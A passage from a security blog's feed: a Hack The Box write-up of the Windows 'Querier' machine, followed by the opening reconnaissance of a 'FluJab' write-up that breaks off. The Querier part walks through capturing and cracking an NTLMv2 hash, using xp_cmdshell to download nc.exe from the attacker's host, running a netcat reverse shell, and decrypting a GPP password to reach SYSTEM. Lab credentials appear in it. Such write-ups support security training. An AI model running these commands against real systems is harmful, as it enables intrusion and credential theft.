&lt;h4 id=&quot;great-we-got-connection-credentials-for-the-mssql-server-&quot;&gt;Great, we got connection credentials for the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
&lt;h4 id=&quot;i-used-mssqlclientpy-from-impacket-to-connect-to-the-server-first-attempt-failed-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;mssqlclient.py&lt;/code&gt; from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt;&lt;/a&gt; to connect to the server. First attempt failed :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# /opt/impacket/examples/mssqlclient.py reporting@querier.htb -db volume 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-added-the-windows-authentication-option--windows-auth-and-it-worked-&quot;&gt;I added the windows authentication option (&lt;code class=&quot;highlighter-rouge&quot;&gt;-windows-auth&lt;/code&gt;) and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;unfortunately--permission-denied-for-xp_cmdshell-&quot;&gt;Unfortunately … permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-responder-responder--i-tun0-and-used-xp_dirtree-to-see-what-hashes-can-i-catch-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;responder -I tun0&lt;/code&gt;) and used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; to see what hashes can I catch :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:53af3039d4607fd0:2423D19E432FFDDC2E4BF3B1E45272A5:0101000000000000C0653150DE09D201C11337A1C52B6EA7000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000051E8A512CD87D5811D02139C02C80CC4814E3213A0CCBD9EC4B588C8FCC85AD70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310039002E0032003700000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::1d968811d030fdad::
[*] Skipping previously captured hash for \gX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-we-got-the-ntlmv2-hash-for-mssql-svc&quot;&gt;And we got the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-used-john-and-rockyou-to-crack-the-hash-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; to crack the hash :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# john --wordlist=/usr/share/wordlists/rockyou.txt mssql-svc.hash 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:07 DONE (2019-06-21 07:41) 0.1321g/s 1184Kp/s 1184Kc/s 1184KC/s correforenz..corby909
Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-its-time-to-enable-xp_cmdshell-and-get-a-reverse-shell&quot;&gt;Now it’s time to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; and get a reverse shell.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-rce-i-ran-a-python-server-to-host-ncexe-then-i-used-invoke-webrequest-to-download-it-&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt; to download it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; EXEC xp_cmdshell 'powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\appdata\local\temp\nc.exe http://10.10.xx.xx/nc.exe'
output                                                                                                                                                                                                                                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
NULL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-got-a-reverse-shell-&quot;&gt;Then I got a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'C:\Users\mssql-svc\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1337'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;one-of-the-things-to-check-when-enumerating-windows-machines-is-group-policy-passwords-which-happened-to-be-the-privilege-escalation-vector-here-i-checked-group-policy-passwords-and-found-administrators-password-&quot;&gt;One of the things to check when enumerating Windows machines is group policy passwords which happened to be the privilege escalation vector here. I checked group policy passwords and found Administrator’s password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/10.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/querier/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;groupsxml-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Groups.xml&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2019-01-28 23:12:48&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{CD450F70-CDB8-4948-B908-F8D038C59B6C}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userContext=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;removePolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;policyApplied=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/Properties&amp;gt;&amp;lt;/User&amp;gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-still-need-to-decrypt-the-password-which-can-be-easily-done-using-gpp-decrypt-&quot;&gt;We still need to decrypt the password which can be easily done using &lt;code class=&quot;highlighter-rouge&quot;&gt;gpp-decrypt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
MyUnclesAreMarioAndLuigi!!1!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;password-is-myunclesaremarioandluigi1-we-can-use-it-with-psexecpy-from-impacket-and-get-a-shell-as-system-&quot;&gt;Password is &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;. We can use it with &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt; and get a shell as system :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;second-write-up--hack-the-box---querier-commando&quot;&gt;Second write-up : &lt;a href=&quot;/hack-the-box/querier-2&quot;&gt;Hack The Box - Querier (Commando)&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post here. It’s a Windows box and its ip is 10.10.10.125, I added it to /etc/hosts as querier.htb. Let’s jump right in! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. Let’s check smb. Smb We need to list the shares first. I used smbclient : ``` smbclient –list //querier.htb/ -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier/0.png" /></entry><entry><title type="html">Hack The Box - FluJab</title><link href="http://localhost:4000/hack-the-box/flujab/" rel="alternate" type="text/html" title="Hack The Box - FluJab" /><published>2019-06-15T00:00:00+02:00</published><updated>2019-06-15T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/flujab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/flujab/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-flujab-retired-and-heres-my-write-up-about-it-this-machine-had-a-lot-of-rabbit-holes-and-trolls-which-made-it-hard-to-enjoy-the-machine-but-without-mentioning-those-annoying-things-this-machine-had-some-really-cool-web-exploitation-parts-like-cookie-manipulation-authentication-bypasses-and-most-importantly-an-interesting-sql-injection-vulnerability-ajenti-administration-panel-was-installed-on-the-box-and-i-could-get-credentials-for-it-by-exploiting-the-sqli--after-that-i-could-use-a-users-public-ssh-key-to-get-the-private-key-as-it-was-vulnerable-to-cve-2008-0166-then-i-escaped-rbash-and-exploited-a-vulnerable-version-of-screen-to-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010124-i-added-it-to-etchosts-as-flujabhtb-lets-jump-right-in-&quot;&gt;Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection vulnerability. &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel was installed on the box and I could get credentials for it by exploiting the &lt;code class=&quot;highlighter-rouge&quot;&gt;SQLi&lt;/code&gt;,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt; then I escaped &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; and exploited a vulnerable version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; to get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.124&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC flujab.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/1.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ssh-on-port-22-http-on-ports-80-and-8080-and-https-on-port-443-theres-also-some-sort-of-virtual-hosting-as-we-can-see-from-the-nmap-scan-and-there-are-a-lot-of-domains-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on ports 80 and 8080 and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443. There’s also some sort of virtual hosting as we can see from the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan and there are a lot of domains …&lt;/h4&gt;
&lt;h4 id=&quot;we-can-also-check-the-ssl-certificate-manually-&quot;&gt;We can also check the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssl&lt;/code&gt; certificate manually :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;i-added-all-of-them-to-etchosts-and-checked-them-however-i-will-skip-the-rabbit-holes-in-the-write-up-because-its-just-a-waste-of-time-if-we-take-a-look-at-what-we-have-&quot;&gt;I added all of them to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-machine-name-is-flujab-so-we-are-only-interested-in-&quot;&gt;The machine name is &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab&lt;/code&gt; so we are only interested in :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;console.flujab.htb
sys.flujab.htb
smtp.flujab.htb
freeflujab.htb
flujab.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-saw-that-error-about-direct-ip-access-when-we-visited-flujabhtb-lets-check-the-other-4&quot;&gt;We saw that error about direct ip access when we visited &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;, Let’s check the other 4.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;console.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;just-a-troll-&quot;&gt;Just a troll !&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sys.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-same-error-on-flujabhtb&quot;&gt;The same error on &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-dont-have-any-credentials-for-that&quot;&gt;We don’t have any credentials for that.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;freeflujab.htb&lt;/code&gt; : 
&lt;img src=&quot;/images/hackthebox/flujab/10.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/11.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/12.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/13.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;that-one-is-interesting-i-tried-to-run-gobuster-but-there-was-a-wildcard-response-when-i-checked-manually-i-found-that-instead-of-responding-with-404-it-responds-with-a-redirection-to-httpsclownwarehtbcwerror_pagesphp-which-has-a-gif-of-a-strange-creepy-clown-&quot;&gt;That one is interesting. I tried to run &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; but there was a wildcard response. When I checked manually I found that instead of responding with &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; it responds with a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://clownware.htb/cwerror_pages.php&lt;/code&gt; which has a &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; of a strange creepy clown …&lt;/h4&gt;
&lt;h4 id=&quot;note--i-checked-them-all-on-port-8080-too-but-i-always-got-the-direct-ip-access-error&quot;&gt;Note : I checked them all on port 8080 too but I always got the direct ip access error.&lt;/h4&gt;
&lt;h4 id=&quot;i-started-burp-and-configured-the-scope-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; and configured the scope :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-ran-the-spider-&quot;&gt;Then I ran the spider :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;results-&quot;&gt;Results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/20.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-the-requests-and-the-responses-of-different-pages-and-actions-i-noticed-in-one-of-the-responses-a-set-cookie-header-that-sets-a-cookie-called-modus-and-sets-the-path-for-it-to-smtp_config&quot;&gt;I checked the requests and the responses of different pages and actions. I noticed in one of the responses a &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; header that sets a cookie called &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; and sets the path for it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?smtp_config&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-requested-smtp_config-in-the-browser-and-looked-at-the-request-in-burp-&quot;&gt;I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;/?smtp_config&lt;/code&gt; in the browser and looked at the request in &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
